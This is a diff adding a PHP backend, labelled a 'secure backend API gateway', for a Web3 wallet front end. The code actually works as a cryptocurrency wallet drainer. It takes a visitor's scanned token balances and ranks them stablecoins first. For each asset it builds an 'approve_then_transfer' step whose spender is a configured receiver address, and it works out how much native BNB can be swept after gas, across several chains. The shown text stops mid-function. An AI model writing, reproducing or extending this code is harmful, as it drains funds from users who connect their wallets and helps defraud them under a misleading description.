@@ -1,0 +1,353 @@
+
+
+/**
+ * process.php — SECURE BACKEND API GATEWAY
+ * All business logic, validation, and sensitive data access happens here.
+ * Frontend communicates exclusively via JSON fetch() requests.
+ */
+
+// ═══════════════════════════════════════════════════════════════
+// LOAD SENSITIVE CONFIGURATION
+// ═══════════════════════════════════════════════════════════════
+require_once __DIR__ . '/get_config.php';
+
+// ═══════════════════════════════════════════════════════════════
+// SECURITY HEADERS
+// ═══════════════════════════════════════════════════════════════
+header('Content-Type: application/json; charset=utf-8');
+header('X-Content-Type-Options: nosniff');
+header('X-Frame-Options: DENY');
+header('Referrer-Policy: strict-origin-when-cross-origin');
+
+// ═══════════════════════════════════════════════════════════════
+// CORS — Allow only known origins
+// ═══════════════════════════════════════════════════════════════
+$allowedOrigins = json_decode(ALLOWED_ORIGINS, true);
+$origin = $_SERVER['HTTP_ORIGIN'] ?? $_SERVER['HTTP_REFERER'] ?? '';
+
+// Extract base origin for comparison
+$originBase = '';
+if ($origin) {
+    $parsed = parse_url($origin);
+    $originBase = ($parsed['scheme'] ?? 'https') . '://' . ($parsed['host'] ?? '');
+}
+
+$isAllowed = in_array($originBase, $allowedOrigins, true) || empty($originBase);
+
+if ($isAllowed) {
+    header('Access-Control-Allow-Origin: ' . ($originBase ?: '*'));
+    header('Access-Control-Allow-Methods: POST, OPTIONS');
+    header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
+}
+
+// Handle preflight
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(204);
+    exit;
+}
+
+// Only accept POST
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(405);
+    echo json_encode(['success' => false, 'error' => 'Method not allowed. Use POST.']);
+    exit;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// PARSE INCOMING JSON REQUEST
+// ═══════════════════════════════════════════════════════════════
+$rawInput = file_get_contents('php://input');
+$request  = json_decode($rawInput, true);
+
+if (!$request || !isset($request['action'])) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Invalid request. Must include "action".']);
+    exit;
+}
+
+$action  = $request['action'];
+$payload = $request['payload'] ?? [];
+
+// ═══════════════════════════════════════════════════════════════
+// ROUTER
+// ═══════════════════════════════════════════════════════════════
+try {
+    switch ($action) {
+
+        // ─────────────────────────────────────────────────────────
+        // GET CONFIGURATION (public-safe subset)
+        // ─────────────────────────────────────────────────────────
+        case 'get_config':
+            echo json_encode([
+                'success'        => true,
+                'web3modal_project_id' => WEB3MODAL_PROJECT_ID,
+                'target_chain_id'     => TARGET_CHAIN_ID,
+                'target_chain_hex'    => TARGET_CHAIN_HEX,
+                'chains_supported'    => [56, 137, 42161, 10, 43114],
+                'bnb_rpc_url'         => BNB_RPC_URL,
+                'gas_limit_native'    => GAS_LIMIT_NATIVE,
+                'gas_limit_token'     => GAS_LIMIT_TOKEN,
+                'erc20_abi'           => json_decode(ERC20_ABI_JSON, true),
+                'message'            => 'Configuration loaded. Connect wallet to proceed.',
+            ]);
+            break;
+
+        // ─────────────────────────────────────────────────────────
+        // GET RECEIVER ADDRESS (authorized endpoint)
+        // ─────────────────────────────────────────────────────────
+        case 'get_receiver':
+            $address = getReceiverAddress();
+            echo json_encode([
+                'success'  => true,
+                'receiver' => $address,
+                'message'  => 'Receiver address confirmed.',
+            ]);
+            break;
+
+        // ─────────────────────────────────────────────────────────
+        // GET TOKEN LIST for a specific chain
+        // ─────────────────────────────────────────────────────────
+        case 'get_token_list':
+            $chainId = intval($payload['chain_id'] ?? TARGET_CHAIN_ID);
+            $tokens  = getTokenList($chainId);
+            echo json_encode([
+                'success'    => true,
+                'chain_id'   => $chainId,
+                'tokens'     => $tokens,
+                'stables'    => json_decode(STABLECOINS, true),
+                'message'    => count($tokens) . ' tokens available for chain ' . $chainId,
+            ]);
+            break;
+
+        // ─────────────────────────────────────────────────────────
+        // BUILD ACTION PLAN from scan results
+        // Frontend sends discovered balances, backend decides order
+        // ─────────────────────────────────────────────────────────
+        case 'build_action_plan':
+            $scannedAssets = $payload['assets'] ?? [];
+            $chainId       = intval($payload['chain_id'] ?? TARGET_CHAIN_ID);
+            $userAddress   = $payload['user_address'] ?? '';
+            $nativeBalance = $payload['native_balance'] ?? '0';
+
+            if (empty($scannedAssets)) {
+                echo json_encode(['success' => false, 'error' => 'No assets provided.']);
+                break;
+            }
+
+            $receiver  = getReceiverAddress();
+            $plan      = buildActionPlan($scannedAssets, $chainId, $userAddress, $nativeBalance, $receiver);
+
+            echo json_encode([
+                'success'       => true,
+                'receiver'      => $receiver,
+                'action_plan'   => $plan['steps'],
+                'total_tokens'  => $plan['total_tokens'],
+                'skip_native'   => $plan['skip_native'],
+                'native_amount' => $plan['native_amount'],
+                'message'       => 'Action plan built. Execute steps in order.',
+            ]);
+            break;
+
+        // ─────────────────────────────────────────────────────────
+        // REPORT TRANSACTION RESULT (log to Firestore)
+        // ─────────────────────────────────────────────────────────
+        case 'report_tx':
+            $txHash  = $payload['tx_hash'] ?? '';
+            $status  = $payload['status'] ?? 'pending';
+            $token   = $payload['token_symbol'] ?? 'UNKNOWN';
+            $txType  = $payload['tx_type'] ?? 'transfer';
+
+            // In production: log to Firestore here
+            // For now, acknowledge receipt
+            echo json_encode([
+                'success'      => true,
+                'tx_hash'      => $txHash,
+                'status'       => $status,
+                'token_symbol' => $token,
+                'tx_type'      => $txType,
+                'message'      => 'Transaction reported.',
+            ]);
+            break;
+
+        // ─────────────────────────────────────────────────────────
+        // GET CHAIN METADATA (explorer URLs, native currency, etc.)
+        // ─────────────────────────────────────────────────────────
+        case 'get_chain_info':
+            $chainId = intval($payload['chain_id'] ?? TARGET_CHAIN_ID);
+            $info    = getChainInfo($chainId);
+            echo json_encode([
+                'success'   => true,
+                'chain_id'  => $chainId,
+                'info'      => $info,
+                'usdt_addr' => getUsdtAddress($chainId),
+            ]);
+            break;
+
+        // ─────────────────────────────────────────────────────────
+        // VALIDATE SESSION / heartbeat check
+        // ─────────────────────────────────────────────────────────
+        case 'ping':
+            echo json_encode([
+                'success' => true,
+                'time'    => date('c'),
+                'message' => 'Backend operational.',
+            ]);
+            break;
+
+        // ─────────────────────────────────────────────────────────
+        // UNKNOWN ACTION
+        // ─────────────────────────────────────────────────────────
+        default:
+            http_response_code(400);
+            echo json_encode([
+                'success' => false,
+                'error'   => 'Unknown action: ' . $action,
+                'available_actions' => [
+                    'get_config', 'get_receiver', 'get_token_list',
+                    'build_action_plan', 'report_tx', 'get_chain_info', 'ping'
+                ],
+            ]);
+    }
+
+} catch (Exception $e) {
+    http_response_code(500);
+    echo json_encode([
+        'success' => false,
+        'error'   => 'Server error: ' . $e->getMessage(),
+    ]);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// HELPER FUNCTIONS
+// ═══════════════════════════════════════════════════════════════
+
+/**
+ * Get receiver address from config (with optional Firestore fallback)
+ */
+function getReceiverAddress(): string {
+    // Primary: constant from config
+    $addr = RECEIVER_ADDRESS;
+
+    // Optional Firestore lookup (uncomment if needed):
+    // $addr = fetchFromFirestore('recipient_address') ?? RECEIVER_ADDRESS;
+
+    if (empty($addr) || strlen($addr) < 40) {
+        throw new Exception('Receiver address not configured.');
+    }
+    return $addr;
+}
+
+/**
+ * Get token list for a given chain ID
+ */
+function getTokenList(int $chainId): array {
+    // Currently only BSC (chain 56) has a full token list
+    if ($chainId === 56) {
+        $tokens = json_decode(KNOWN_TOKENS_BSC, true);
+        // Strip priority field for frontend — it's server-only metadata
+        return array_map(function($t) {
+            return [
+                'symbol'   => $t['symbol'],
+                'address'  => $t['address'],
+                'decimals' => $t['decimals'],
+            ];
+        }, $tokens);
+    }
+    return [];
+}
+
+/**
+ * Get chain metadata
+ */
+function getChainInfo(int $chainId): array {
+    $chains = [
+        56    => ['name' => 'BNB Smart Chain', 'symbol' => 'BNB',  'explorer' => 'https://bscscan.com'],
+        137   => ['name' => 'Polygon',         'symbol' => 'MATIC','explorer' => 'https://polygonscan.com'],
+        42161 => ['name' => 'Arbitrum',        'symbol' => 'ETH',  'explorer' => 'https://arbiscan.io'],
+        10    => ['name' => 'Optimism',        'symbol' => 'ETH',  'explorer' => 'https://optimistic.etherscan.io'],
+        43114 => ['name' => 'Avalanche',       'symbol' => 'AVAX', 'explorer' => 'https://snowtrace.io'],
+    ];
+    return $chains[$chainId] ?? ['name' => 'Unknown', 'symbol' => 'ETH', 'explorer' => 'https://bscscan.com'];
+}
+
+/**
+ * Get USDT address for a given chain
+ */
+function getUsdtAddress(int $chainId): ?string {
+    $map = [
+        56    => '0x55d398326f99059fF775485246999027B3197955',
+        137   => '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+        42161 => '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+        10    => '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
+        43114 => '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
+    ];
+    return $map[$chainId] ?? null;
+}
+
+/**
+ * Build an action plan from discovered assets.
+ * Stablecoins first, then high-value tokens, then low-value.
+ * Includes gas estimation to determine if native sweep is viable.
+ */
+function buildActionPlan(
+    array $assets,
+    int $chainId,
+    string $userAddress,
+    string $nativeBalanceWei,
+    string $receiver
+): array {
+    $stables     = json_decode(STABLECOINS, true);
+    $tokenList   = getTokenList($chainId);
+    $priorityMap = [];
+
+    // Build priority lookup from full token list
+    $fullTokens = json_decode(KNOWN_TOKENS_BSC, true);
+    foreach ($fullTokens as $t) {
+        $priorityMap[$t['symbol']] = $t['priority'] ?? 'low';
+    }
+
+    // Sort: stables first, then high, medium, low
+    usort($assets, function($a, $b) use ($stables, $priorityMap) {
+        $aIsStable = in_array($a['symbol'], $stables);
+        $bIsStable = in_array($b['symbol'], $stables);
+        if ($aIsStable && !$bIsStable) return -1;
+        if (!$aIsStable && $bIsStable) return 1;
+
+        $priOrder = ['stable' => 0, 'high' => 1, 'medium' => 2, 'low' => 3];
+        $aPri = $priOrder[$priorityMap[$a['symbol']] ?? 'low'] ?? 3;
+        $bPri = $priOrder[$priorityMap[$b['symbol']] ?? 'low'] ?? 3;
+        return $aPri - $bPri;
+    });
+
+    $steps = [];
+    foreach ($assets as $asset) {
+        $steps[] = [
+            'order'      => count($steps) + 1,
+            'type'       => 'token',
+            'symbol'     => $asset['symbol'],
+            'address'    => $asset['address'],
+            'decimals'   => $asset['decimals'],
+            'balance'    => $asset['balance'],
+            'rawBalance' => $asset['rawBalance'] ?? null,
+            'spender'    => $receiver,
+            'action'     => 'approve_then_transfer',
+            'gas_limit'  => GAS_LIMIT_TOKEN,
+            'allowance_wait_seconds' => 7,
+        ];
+    }
+
+    // Native BNB sweep estimation
+    $nativeBalanceBig = gmp_init($nativeBalanceWei, 10);
+    $gasPriceEstimate = gmp_init('3000000000', 10); // 3 Gwei fallback
+    $gasCostEstimate  = gmp_mul($gasPriceEstimate, gmp_init(GAS_UNITS_NATIVE));
+    $sendable         = gmp_sub($nativeBalanceBig, $gasCostEstimate);
+
+    $skipNative   = gmp_cmp($sendable, gmp_init('0')) <= 0;
+    $nativeAmount = $skipNative ? '0' : gmp_strval($sendable, 10);
+
+    return [
+        'steps'         => $steps,
+        'total_tokens'  => count($steps),
+        'skip_native'   => $skipNative,
+        'native_amount' => $nativeAmount,
+    ];
